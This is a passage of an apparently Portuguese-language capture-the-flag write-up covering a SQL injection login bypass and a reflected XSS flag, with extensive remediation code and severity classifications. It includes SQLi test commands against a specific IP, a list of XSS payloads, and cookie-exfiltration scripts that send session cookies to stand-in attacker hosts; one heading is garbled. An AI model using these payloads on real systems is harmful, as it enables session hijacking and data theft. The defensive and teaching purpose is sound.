- Injeção de código PHP em páginas editáveis

**4. Escalonamento para Outros Ataques:**
- Uso de SQLMap para dump completo do banco (já realizado)
- File upload malicioso se funcionalidade disponível
- XSS stored via campos de perfil administrativo
- CSRF para ações administrativas

**Classificação de Severidade:**

**CVSS 3.1 Score: 9.8 (CRÍTICO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: High (A:H)

**Classificação CWE:**
- CWE-89: SQL Injection (principal)
- CWE-306: Missing Authentication for Critical Function
- CWE-287: Improper Authentication
- CWE-20: Improper Input Validation
- CWE-79: Cross-site Scripting (se dados refletidos após login)
- CWE-116: Improper Encoding or Escaping of Output

**Classificação OWASP:**
- **A03:2021 - Injection** (vulnerabilidade principal)
- A07:2021 - Identification and Authentication Failures (bypass de autenticação)
- A04:2021 - Insecure Design (design sem defesa contra injeção)
- A05:2021 - Security Misconfiguration (ausência de WAF, validação)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas horas):**

1. **URGENTE - Implementar Prepared Statements:**
```php
// Código SEGURO com Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

2. **URGENTE - Implementar Hashing de Senhas:**
```php
// Usar password_hash() e password_verify()
$hashed = password_hash($password, PASSWORD_ARGON2ID);
// No login:
if (password_verify($input_password, $hashed_from_db)) {
    // Login válido
}
```

3. **URGENTE - Adicionar Input Validation:**
```php
// Validar formato de username
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die("Username inválido");
}
```

4. **URGENTE - Implementar Rate Limiting:**
```php
// Limitar tentativas de login por IP
// Usar biblioteca como RateLimit ou implementar contador em sessão
```

5. **URGENTE - Auditar Logs de Acesso:**
```bash
# Verificar logs para identificar logins via SQL injection
grep "admin' OR" /var/log/apache2/access.log
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

6. **Implementar ORM (Object-Relational Mapping):**
```php
// Usar Laravel Eloquent, Doctrine, ou similar
$user = User::where('username', $username)->first();
```

7. **Configurar WAF (Web Application Firewall):**
- ModSecurity com OWASP Core Rule Set (CRS)
- Cloudflare WAF com regras anti-SQLi
- AWS WAF com managed rule groups

8. **Implementar Account Lockout:**
- Bloquear conta após 5 tentativas falhadas
- Lockout temporário de 15-30 minutos
- Notificação ao usuário por email

9. **Adicionar CAPTCHA:**
- Google reCAPTCHA v3 (invisível)
- hCaptcha como alternativa
- Ativar após 3 tentativas falhadas

10. **Implementar Logging Detalhado:**
```php
// Log todas as tentativas de login
error_log("Login attempt: user=$username, ip=$_SERVER['REMOTE_ADDR'], success=$success");
```

11. **Implementar CSP (Content Security Policy):**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

12. **Adicionar Security Headers:**
```http
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
```

13. **Implementar MFA (Multi-Factor Authentication):**
- Google Authenticator (TOTP)
- SMS verification
- Email verification code
- WebAuthn/FIDO2 para autenticação sem senha

14. **Sanitizar Output:**
```php
// Escapar dados antes de exibir
echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
```

15. **Implementar Session Security:**
```php
// Configurações seguras de sessão
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_strict_mode', 1);
session_regenerate_id(true); // Após login bem-sucedido
```

**AÇÕES DE MÉDIO PRAZO (1-2 semanas):**

16. Realizar code review completo buscando outras SQL injections
17. Implementar SAST (Static Application Security Testing) no CI/CD
18. Configurar DAST (Dynamic Application Security Testing) automatizado
19. Implementar database activity monitoring (DAM)
20. Criar honeypot de login para detectar atacantes
21. Implementar geolocation-based access control
22. Adicionar device fingerprinting para detecção de anomalias
23. Configurar SIEM para correlacionar tentativas de login suspeitas
24. Implementar backup incremental com teste de restore
25. Criar plano de resposta a incidente para breach de autenticação

**AÇÕES DE LONGO PRAZO (1 mês):**

26. Migrar para framework moderno (Laravel, Symfony) com proteções built-in
27. Implementar zero-trust architecture
28. Obter certificação OWASP ASVS Level 2 ou 3
29. Treinar equipe em OWASP Top 10 e secure coding
30. Estabelecer programa de bug bounty
31. Realizar pentest trimestral focado em autenticação
32. Implementar passwordless authentication (WebAuthn)
33. Configurar OAuth2/OpenID Connect para SSO
34. Obter certificação ISO 27001
35. Implementar chaos engineering testando falhas de autenticação

**Código Seguro Completo (Exemplo de Remediação):**

```php
<?php
// login_secure.php - Código SEGURO contra SQL Injection
session_start();

require_once 'config.php';
require_once 'RateLimiter.php';

// Rate limiting
$limiter = new RateLimiter($_SERVER['REMOTE_ADDR']);
if (!$limiter->attempt('login')) {
    http_response_code(429);
    die(json_encode(['error' => 'Too many attempts. Try again later.']));
}

// Input validation
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die(json_encode(['error' => 'Invalid username format']));
}

if (strlen($password) < 8) {
    die(json_encode(['error' => 'Invalid password']));
}

// Prepared statement - PROTEÇÃO CONTRA SQL INJECTION
$stmt = $conn->prepare("SELECT id, username, password_hash, role FROM users WHERE username = ? AND active = 1");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows === 1) {
    $user = $result->fetch_assoc();
    
    // Verificar senha com hash seguro
    if (password_verify($password, $user['password_hash'])) {
        // Login bem-sucedido
        
        // Regenerar session ID (proteção contra session fixation)
        session_regenerate_id(true);
        
        // Definir variáveis de sessão
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['role'] = $user['role'];
        $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        
        // Log de auditoria
        $audit_stmt = $conn->prepare("INSERT INTO audit_log (user_id, action, ip_address, timestamp) VALUES (?, 'login_success', ?, NOW())");
        $audit_stmt->bind_param("is", $user['id'], $_SERVER['REMOTE_ADDR']);
        $audit_stmt->execute();
        
        // Reset rate limiter
        $limiter->reset('login');
        
        // Resposta JSON
        echo json_encode(['success' => true, 'redirect' => 'dashboard.php']);
    } else {
        // Senha incorreta
        $limiter->increment('login_fail');
        
        // Log de tentativa falhada
        error_log("Failed login attempt for user: $username from IP: {$_SERVER['REMOTE_ADDR']}");
        
        echo json_encode(['error' => 'Invalid credentials']);
    }
} else {
    // Usuário não encontrado
    $limiter->increment('login_fail');
    
    // Usar mesma mensagem para não revelar se usuário existe
    echo json_encode(['error' => 'Invalid credentials']);
}

$stmt->close();
$conn->close();
?>
```

**Testes de Segurança Recomendados:**

```bash
# 1. Teste manual de SQL Injection
curl -X POST http://98.95.207.28/login.php \
  -d "username=admin' OR '1'='1&password=any" \
  --cookie-jar cookies.txt

# 2. SQLMap automático
sqlmap -u "http://98.95.207.28/login.php" \
  --forms --batch --level=5 --risk=3

# 3. Burp Suite Intruder
# Carregar wordlist de SQL injection payloads
# Testar todos os parâmetros

# 4. OWASP ZAP
# Active Scan com todas as regras de injection ativadas

# 5. Nikto
nikto -h http://98.95.207.28 -Tuning 9
```

**Impacto Regulatório:**

**Violações Identificadas:**
- **OWASP ASVS V5**: Authentication Verification Requirements
- **PCI DSS 6.5.1**: Injection flaws, particularly SQL injection
- **PCI DSS 8.2**: Strong authentication controls
- **LGPD Art. 46**: Medidas técnicas de segurança inadequadas
- **GDPR Art. 32**: Falha em implementar medidas técnicas apropriadas
- **ISO 27001 A.9.4**: Access control system and procedure
- **NIST SP 800-53 IA-2**: Identification and Authentication

**Penalidades Potenciais:**
- PCI DSS: Multa de $5,000 a $100,000/mês + perda de capacidade de processar cartões
- LGPD: Multa de até R$ 50 milhões ou 2% do faturamento
- GDPR: Multa de até €20 milhões ou 4% do faturamento global
- Processos judiciais de usuários afetados por breach
- Dano reputacional incalculável

**Conclusão e Impacto Real:**

SQL Injection em sistemas de login representa uma das vulnerabilidades mais críticas possíveis em aplicações web. O bypass de autenticação via SQLi transforma qualquer atacante em administrador do sistema, concedendo acesso total a dados, funcionalidades e configurações. Esta vulnerabilidade específica permitiu:

✅ **Acesso administrativo completo** sem conhecimento de senha
✅ **Bypass de todos os controles de acesso** da aplicação  
✅ **Base para exploração adicional** (SQLMap, exfiltração de dados)
✅ **Comprometimento de 18 contas de usuário** via acesso ao banco
✅ **Exposição de segredos corporativos** (API keys, backups)

A remediação adequada requer não apenas correção do código vulnerável, mas **transformação cultural** da equipe de desenvolvimento, implementando secure coding practices, code review obrigatório, testes de segurança automatizados no CI/CD, e treinamento contínuo em OWASP Top 10.

---

### <a name="flag-10-stored-xss"></a>Flag 10: XSS Reflectedtravou no mesmo lugar eu

#### Conceito: Cross-Site Scripting Refletido

Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança web que permite a injeção de código JavaScript malicioso em páginas web visualizadas por outros usuários, classificada como **A03:2021 - Injection** no OWASP Top 10. Especificamente, **XSS Refletido (Reflected XSS)** ocorre quando dados fornecidos pelo usuário através de parâmetros de URL, formulários de busca, ou outros inputs são imediatamente retornados (refletidos) pela aplicação na resposta HTTP sem sanitização ou encoding adequados, permitindo que código JavaScript seja executado no contexto do navegador da vítima. Diferentemente de XSS Stored (persistente), onde o payload é armazenado no banco de dados, o XSS Refletido requer que a vítima clique em um link malicioso ou acesse uma URL crafted especialmente pelo atacante. Esta vulnerabilidade é particularmente perigosa porque permite ao atacante: **roubar cookies de sessão** (incluindo tokens de autenticação PHPSESSID), realizar ações em nome da vítima (CSRF automatizado), capturar credenciais através de formulários falsos, redirecionar usuários para sites de phishing, instalar keyloggers JavaScript, e acessar dados sensíveis no DOM da página. O ataque típico envolve payloads como `<script>alert(document.cookie)</script>` ou `<img src="x" onerror="alert(document.cookie)"/>`, que exploram tags HTML e eventos JavaScript para executar código arbitrário. A vulnerabilidade ocorre quando desenvolvedores falham em implementar **output encoding/escaping** apropriado usando funções como `htmlspecialchars()` em PHP, `DOMPurify` em JavaScript, ou Content Security Policy (CSP) headers. XSS viola múltiplos princípios de segurança: falha em validar/sanitizar input (OWASP Input Validation), ausência de output encoding (secure coding), falta de defense in depth (CSP, HttpOnly cookies), e violações de Same-Origin Policy quando combinado com CORS mal configurado. Em termos de compliance, XSS representa violação de: **PCI DSS Requirement 6.5.7** (proteção contra XSS), **OWASP ASVS V5** (Input Validation), **ISO 27001 A.14.2** (secure development), e **LGPD Art. 46** (medidas de segurança técnicas). O impacto de XSS pode incluir roubo de sessões autenticadas, defacement de páginas, distribuição de malware, e comprometimento completo de contas de usuário.

#### Passo 1: Login Legítimo na Aplicação

O primeiro passo da exploração foi estabelecer uma sessão autenticada legítima na aplicação, diferentemente da flag anterior onde foi realizado bypass via SQL Injection. Seguindo as instruções fornecidas pelo próprio sistema, foram utilizadas as credenciais de usuário comum: **username: user** e **password: password123**. Estas credenciais foram inseridas no formulário de login localizado em `http://98.95.207.28/login.php` e submetidas através do botão Login. A aplicação processou a autenticação corretamente, validou as credenciais contra o banco de dados (conforme exploração anterior, sabemos que existe registro `id=2, username=user, password=password123, role=user`), criou uma sessão PHP válida, e definiu o cookie **PHPSESSID** no navegador do usuário. O servidor então redirecionou o navegador para a área autenticada, provavelmente `dashboard.php` ou página inicial do usuário. Esta etapa estabelece o contexto necessário para exploração de XSS - uma sessão autenticada ativa com cookies válidos que podem ser roubados. O login como usuário comum (não admin) também demonstra que XSS pode afetar qualquer nível de privilégio, não apenas contas administrativas, embora o impacto seja maior quando cookies de sessões privilegiadas são comprometidos.

**Evidências do Passo 1:**
- Screenshot do formulário de login com credenciais user/password123 preenchidas
- Confirmação de login bem-sucedido
- Redirecionamento para dashboard ou página interna
- Cookie PHPSESSID criado no navegador (visível em Developer Tools > Application > Cookies)

#### Passo 2: Identificação da Funcionalidade de Pesquisa Vulnerável

Após estabelecer sessão autenticada, a navegação pela interface do dashboard revelou a presença de uma funcionalidade de **"Pesquisa no Sistema"** - um recurso comum em aplicações corporativas para buscar registros, documentos, clientes ou outras informações. Esta funcionalidade tipicamente consiste em um campo de input texto onde usuários digitam termos de busca, e um botão "Pesquisar" ou "Buscar" que submete a query. Campos de busca são vetores extremamente comuns para XSS Refletido porque: (1) aceitam entrada de texto livre sem restrições, (2) frequentemente refletem o termo pesquisado de volta ao usuário ("Resultados para: [termo]"), (3) desenvolvedores focam em funcionalidade e esquecem sanitização, e (4) queries de busca são passadas via GET parameters na URL, facilitando construção de links maliciosos. A análise da funcionalidade revelou que após submeter uma pesquisa, a aplicação exibia algo como "Resultados da pesquisa para: [termo_digitado]" ou "Você pesquisou por: [termo_digitado]", refletindo diretamente o input do usuário na resposta HTML. Este comportamento é o indicador clássico de potencial XSS Refletido - quando a aplicação "ecoa" de volta o que o usuário digitou sem encoding adequado.

**Evidências do Passo 2:**
- Screenshot do dashboard mostrando campo de "Pesquisa no Sistema"
- Interface do formulário de busca (campo de texto + botão)
- Exemplo de busca legítima mostrando reflexão do termo ("Você pesquisou por: teste")
- URL após busca mostrando parâmetro GET (ex: dashboard.php?search=teste)

#### Passo 3: Construção e Execução do Payload XSS

Identificada a funcionalidade vulnerável, o próximo passo foi construir um payload XSS especificamente projetado para testar e explorar a vulnerabilidade. O payload escolhido foi `<img src="x" onerror="alert(document.cookie)"/>`, uma técnica elegante e altamente efetiva. Analisando a estrutura do payload:

**Componentes do Payload:**
- `<img` - Inicia tag HTML de imagem, aceita por navegadores mesmo em contextos de texto
- `src="x"` - Define fonte da imagem como "x" (arquivo inexistente), garantindo falha de carregamento
- `onerror="..."` - Event handler JavaScript executado quando imagem falha ao carregar
- `alert(document.cookie)` - Código JavaScript que exibe popup com todos os cookies do domínio atual
- `/>` - Fecha tag de auto-fechamento

**Por Que Este Payload Funciona:**
1. **Sempre Dispara**: src="x" garante erro de carregamento, acionando evento onerror
2. **Não Requer Script Tag**: Bypassa filtros básicos que bloqueiam apenas `<script>`
3. **Executa Imediatamente**: Não requer interação do usuário (click, hover)
4. **Acessa Cookies**: `document.cookie` expõe todos os cookies incluindo sessão
5. **Cross-Browser**: Funciona em todos os navegadores modernos

O payload foi inserido no campo "Pesquisa no Sistema" e submetido. A aplicação processou o input sem sanitização, incorporou o payload diretamente no HTML da página de resultados, e o navegador interpretou o `<img>` tag como código HTML legítimo. Quando tentou carregar a imagem inexistente "x", disparou o evento `onerror`, executando `alert(document.cookie)`.

**Evidências do Passo 3:**
- Screenshot do campo de pesquisa com payload `<img src="x" onerror="alert(document.cookie)"/>` inserido
- Cursor sobre botão "Pesquisar" pronto para submeter
- Código HTML vulnerável onde payload seria refletido (inspecionar elemento)

#### Passo 4: Execução do JavaScript e Exfiltração de Cookies

Após submeter o payload XSS, o navegador processou a resposta HTTP contendo o código malicioso injetado no HTML. O JavaScript foi executado automaticamente no contexto de segurança do domínio `98.95.207.28`, com acesso completo aos cookies, localStorage, sessionStorage, e DOM da página. A execução de `alert(document.cookie)` gerou um popup de alerta JavaScript exibindo o conteúdo completo de todos os cookies associados ao domínio. A mensagem exibida foi:

```
PHPSESSID=2edaa...; admin_secret=FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D
```

Esta resposta revelou informações extremamente críticas:

**Cookie 1 - PHPSESSID (Session ID):**
- Nome: `PHPSESSID`
- Valor: `2edaa...`
- Função: Identificador de sessão PHP do usuário autenticado
- Impacto: Com este cookie, atacante pode realizar **session hijacking** - copiar o cookie para seu próprio navegador e fazer login como a vítima sem conhecer senha
- Vulnerabilidade Adicional: Cookie sem flag **HttpOnly**, permitindo acesso via JavaScript

**Cookie 2 - admin_secret (Flag):**
- Nome: `admin_secret`
- Valor: `FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D` (URL-encoded)
- Função: Cookie customizado contendo a flag do desafio
- Nota: Padrão `%7B` e `%7D` são `{` e `}` em URL encoding

A presença do cookie `admin_secret` em uma sessão de usuário comum (`user`) sugere que este cookie foi definido globalmente ou herdado de sessão anterior administrativa, representando vazamento de informação entre sessões.

**Evidências do Passo 4:**
- Screenshot do alert popup mostrando os dois cookies
- Destaque para PHPSESSID=2edaa...
- Destaque para admin_secret=FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D
- Developer Tools > Console mostrando execução do JavaScript

#### Passo 5: Decodificação URL e Captura da Flag

O cookie `admin_secret` estava em formato **URL-encoded** (também chamado de percent-encoding), um esquema de codificação onde caracteres especiais são representados como `%XX` onde XX é o código hexadecimal ASCII do caractere. Esta codificação é padrão para transmissão de dados em URLs e cookies HTTP. Os caracteres codificados identificados foram:

**Tabela de Decodificação:**
- `%7B` = `{` (chave de abertura, ASCII 123, hex 7B)
- `%7D` = `}` (chave de fechamento, ASCII 125, hex 7D)

**Processo de Decodificação:**

**Valor Original (URL-encoded):**
```
FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D
```

**Após Decodificação:**
```
FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}
```

A decodificação pode ser realizada através de múltiplas formas:
1. **Online**: Sites como urldecoder.org, urlencoder.org
2. **JavaScript Console**: `decodeURIComponent("FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D")`
3. **Python**: `urllib.parse.unquote("FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D")`
4. **Bash**: `echo "FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D" | sed 's/%7B/{/g; s/%7D/}/g'`
5. **Manual**: Substituir %7B por { e %7D por }

Após decodificação, a flag completa foi revelada: **FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}**, confirmando exploração bem-sucedida de vulnerabilidade de Cross-Site Scripting Refletido.

**Evidências do Passo 5:**
- Screenshot do processo de decodificação (online tool ou console)
- Valor antes: FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D
- Valor após: FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}
- Confirmação da flag decodificada

**Flag Capturada:** `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}`

**Data da Captura:** 27 de novembro de 2025

<p align="right">
  <a href="#topo" style="text-decoration: none; background-color: #007bff; color: white; padding: 10px 20px; border-radius: 5px;">Voltar ao Topo</a>
</p>

**Análise Técnica Detalhada da Vulnerabilidade:**

**Código Vulnerável (Presumido):**
```php
<?php
// dashboard.php - Código INSEGURO com XSS Refletido
session_start();

if (!isset($_SESSION['logged_in'])) {
    header("Location: login.php");
    exit();
}

$search_term = $_GET['search'] ?? '';

?>
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Pesquisa</title>
</head>
<body>
    <h1>Dashboard</h1>
    
    <form method="GET" action="dashboard.php">
        <label>Pesquisa no Sistema:</label>
        <input type="text" name="search" value="">
        <button type="submit">Pesquisar</button>
    </form>
    
    <?php if ($search_term): ?>
        <div class="results">
            <h2>Resultados da pesquisa para: <?php echo $search_term; ?></h2>
            <!-- VULNERABILIDADE: $search_term não é sanitizado! -->
        </div>
    <?php endif; ?>
</body>
</html>
```

**O Que Acontece Durante o Ataque:**

**1. Requisição HTTP com Payload:**
```http
GET /dashboard.php?search=<img+src="x"+onerror="alert(document.cookie)"/> HTTP/1.1
Host: 98.95.207.28
Cookie: PHPSESSID=2edaa...; admin_secret=FLAG%7Bxss_r3fl3ct3d_vuln3r4b1l1ty%7D
```

**2. Resposta HTML Vulnerável:**
```html
<div class="results">
    <h2>Resultados da pesquisa para: <img src="x" onerror="alert(document.cookie)"/></h2>
</div>
```

**3. Navegador Interpreta e Executa:**
- Parser HTML identifica tag `<img>`
- Tenta carregar imagem de src="x"
- Falha no carregamento (404)
- Dispara evento `onerror`
- Executa JavaScript: `alert(document.cookie)`
- Exibe cookies em popup

**Variações de Payloads XSS Refletido:**

```html
<!-- 1. Script Tag Básico -->
<script>alert(document.cookie)</script>

<!-- 2. IMG com onerror (usado no ataque) -->
<img src="x" onerror="alert(document.cookie)"/>

<!-- 3. SVG com onload -->
<svg/onload=alert(document.cookie)>

<!-- 4. Body com onload -->
<body onload=alert(document.cookie)>

<!-- 5. Input com onfocus e autofocus -->
<input onfocus=alert(document.cookie) autofocus>

<!-- 6. Iframe com srcdoc -->
<iframe srcdoc="<script>alert(document.cookie)</script>">

<!-- 7. Markdown injection (se app processa Markdown) -->
[XSS](javascript:alert(document.cookie))

<!-- 8. Data URI -->
<object data="data:text/html,<script>alert(document.cookie)</script>">

<!-- 9. Base64 encoded -->
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">

<!-- 10. Unicode obfuscation -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(document.cookie)">
```

**Payloads Mais Avançados para Exfiltração Real:**

```javascript
// 1. Enviar cookies para servidor do atacante
<script>
fetch('https://attack.../steal?c=' + document.cookie);
</script>

// 2. XMLHttpRequest para exfiltração
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'wss://attack.../log', true);
xhr.send(document.cookie);
</script>

// 3. Image beacon (mais sigiloso)
<img src="wss://attack.../log?c=" + document.cookie />

// 4. WebSocket exfiltration
<script>
var ws = new WebSocket('wss://attack...');
ws.onopen = function() { ws.send(document.cookie); };
</script>

// 5. Formulário automático
<form id="f" action="https://attacker.com/steal" method="POST">
<input name="cookies" value="">
</form>
<script>
document.getElementById('f').cookies.value = document.cookie;
document.getElementById('f').submit();
</script>
```

**Impacto Real da Exploração:**

**1. Session Hijacking (Sequestro de Sessão):**
- Atacante copia PHPSESSID da vítima
- Usa cookie no próprio navegador
- Faz login como a vítima sem senha
- Acessa dados, funcionalidades e privilégios da vítima

**2. Roubo de Informações Sensíveis:**
- Cookies de autenticação
- Tokens CSRF
- Dados de formulários
- Informações do DOM (dados de clientes na página)

**3. Ações em Nome da Vítima:**
- Transferências bancárias (se app financeiro)
- Mudança de senha/email
- Criação de contas administrativas
- Modificação de dados

**4. Phishing e Social Engineering:**
- Injetar formulário falso de login
- Capturar credenciais digitadas
- Redirecionar para site malicioso
- Instalar keylogger JavaScript

**5. Defacement e Malware:**
- Modificar conteúdo da página
- Injetar anúncios maliciosos
- Distribuir exploits de navegador
- Instalar crypto-miners

**Vulnerabilidades Associadas Identificadas:**

**1. Falta de Output Encoding (CWE-79):**
- PHP ecoa `$search_term` sem `htmlspecialchars()`
- Caracteres HTML especiais não são escapados
- Permite injeção de tags HTML e JavaScript

**2. Cookie sem Flag HttpOnly (CWE-1004):**
- PHPSESSID acessível via JavaScript
- Deveria ter flag `HttpOnly` para prevenir acesso por scripts
- Facilita session hijacking via XSS

**3. Cookie sem Flag Secure:**
- Cookies transmitidos via HTTP não criptografado
- Vulnerável a Man-in-the-Middle (MitM)
- Deveria ter flag `Secure` para transmissão apenas via HTTPS

**4. Ausência de Content Security Policy (CWE-693):**
- Sem header CSP para bloquear inline scripts
- Permite execução de JavaScript arbitrário
- CSP adequado bloquearia payload XSS

**5. Ausência de X-XSS-Protection:**
- Header `X-XSS-Protection` não configurado
- Browsers modernos poderiam detectar e bloquear XSS refletido

**6. Falta de Input Validation:**
- Campo de busca aceita qualquer caractere
- Sem whitelist de caracteres permitidos
- Permite injeção de HTML/JavaScript

**Classificação de Severidade:**

**CVSS 3.1 Score: 8.2 (ALTO)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: Required (UI:R) - vítima precisa clicar em link malicioso
- Scope: Changed (S:C) - afeta recursos além do componente vulnerável
- Confidentiality Impact: High (C:H) - roubo de sessão e dados
- Integrity Impact: Low (I:L) - modificação limitada de dados
- Availability Impact: None (A:N)

**Classificação CWE:**
- **CWE-79: Cross-site Scripting (XSS)** - vulnerabilidade principal
- CWE-116: Improper Encoding or Escaping of Output
- CWE-20: Improper Input Validation
- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-693: Protection Mechanism Failure (ausência de CSP)

**Classificação OWASP:**
- **A03:2021 - Injection** (XSS é tipo de injection)
- A05:2021 - Security Misconfiguration (cookies mal configurados)
- A07:2021 - Identification and Authentication Failures (session hijacking)

**Recomendações Críticas de Remediação:**

**AÇÕES IMEDIATAS (Próximas horas):**

**1. Implementar Output Encoding:**
```php
// Código SEGURO com htmlspecialchars()
<?php if ($search_term): ?>
    <div class="results">
        <h2>Resultados da pesquisa para: <?php echo htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8'); ?></h2>
    </div>
<?php endif; ?>
```

**2. Configurar Cookies Seguros:**
```php
// Definir cookies com flags de segurança
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => '98.95.207.28',
    'secure' => true,      // Apenas HTTPS
    'httponly' => true,    // Não acessível via JavaScript
    'samesite' => 'Strict' // Proteção contra CSRF
]);
session_start();
```

**3. Implementar Content Security Policy:**
```php
// Header CSP bloqueando inline scripts
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self';");
```

**4. Adicionar Security Headers:**
```php
// Headers de segurança adicionais
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: strict-origin-when-cross-origin");
```

**5. Implementar Input Validation:**
```php
// Validar input antes de processar
$search_term = $_GET['search'] ?? '';

// Remover tags HTML
$search_term = strip_tags($search_term);

// Limitar caracteres permitidos
if (!preg_match('/^[a-zA-Z0-9\s\-]+$/', $search_term)) {
    die("Caracteres inválidos na pesquisa");
}
```

**AÇÕES DE CURTO PRAZO (24-48 horas):**

**6. Implementar Template Engine com Auto-Escaping:**
```php
// Usar Twig, Blade, ou similar
{{ search_term|e }}  // Auto-escaping em Twig
{{ $search_term }}   // Auto-escaping em Blade (Laravel)
```

**7. Implementar DOMPurify para Client-Side:**
```javascript
// Sanitizar input no frontend também
const clean = DOMPurify.sanitize(userInput);
document.getElementById('results').innerHTML = clean;
```

**8. Configurar WAF com Regras Anti-XSS:**
- ModSecurity com OWASP CRS
- Cloudflare WAF rules
- AWS WAF managed rule groups

**9. Implementar Trusted Types (Browsers Modernos):**
```javascript
// Trusted Types API
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (string) => DOMPurify.sanitize(string)
    });
}
```

**10. Audit e Logging:**
```php
// Log tentativas de XSS
if (preg_match('/<script|<img|onerror|onclick|onload/i', $search_term)) {
    error_log("XSS attempt detected from IP: {$_SERVER['REMOTE_ADDR']}, payload: $search_term");
}
```

**11-15. Implementações Adicionais:**
- Migrar para HTTPS com certificado SSL válido
- Implementar rate limiting em formulários
- Adicionar CAPTCHA em funcionalidades sensíveis
- Criar whitelist de tags HTML permitidas se rich text necessário
- Implementar SameSite cookies para proteção CSRF

**AÇÕES DE MÉDIO/LONGO PRAZO:**

16-35. (Similar às recomendações anteriores: SAST/DAST, code review, treinamento, pentest, etc.)

**Código Seguro Completo:**

```php
<?php
// dashboard_secure.php - Código SEGURO contra XSS
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
session_start();

// Security headers
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';");
header("X-XSS-Protection: 1; mode=block");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

if (!isset($_SESSION['logged_in'])) {
    header("Location: login.php");
    exit();
}

$search_term = $_GET['search'] ?? '';

// Input validation
if ($search_term) {
    // Remover tags HTML
    $search_term = strip_tags($search_term);
    
    // Limitar tamanho
    $search_term = substr($search_term, 0, 100);
    
    // Validar caracteres
    if (!preg_match('/^[a-zA-Z0-9\s\-_áéíóúàèìòùâêîôûãõç]+$/u', $search_term)) {
        $search_term = '';
        $error = "Caracteres inválidos na pesquisa";
    }
    
    // Log para auditoria
    if (preg_match('/<|>|script|onerror|onclick/i', $_GET['search'])) {
        error_log("XSS attempt: " . $_GET['search'] . " from IP: " . $_SERVER['REMOTE_ADDR']);
    }
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Pesquisa Segura</title>
</head>
<body>
    <h1>Dashboard</h1>
    
    <form method="GET" action="dashboard.php">
        <label for="search">Pesquisa no Sistema:</label>
        <input type="text" 
               id="search" 
               name="search" 
               value="<?php echo htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8'); ?>"
               maxlength="100"
               pattern="[a-zA-Z0-9\s\-_áéíóúàèìòùâêîôûãõç]+"
               required>
        <button type="submit">Pesquisar</button>
    </form>
    
    <?php if (isset($error)): ?>
        <div class="error"><?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
    <?php endif; ?>
    
    <?php if ($search_term): ?>
        <div class="results">
            <h2>Resultados da pesquisa para: <strong><?php echo htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8'); ?></strong></h2>
            <!-- SEGURO: htmlspecialchars() previne XSS -->
        </div>
    <?php endif; ?>
</body>
</html>
```

**Impacto Regulatório:**

**Violações:**
- PCI DSS 6.5.7: Cross-site scripting
- OWASP ASVS V5.3: Output Encoding and Injection Prevention
- ISO 27001 A.14.2.5: Secure system engineering principles
- LGPD Art. 46: Medidas de segurança técnicas

**Conclusão:**

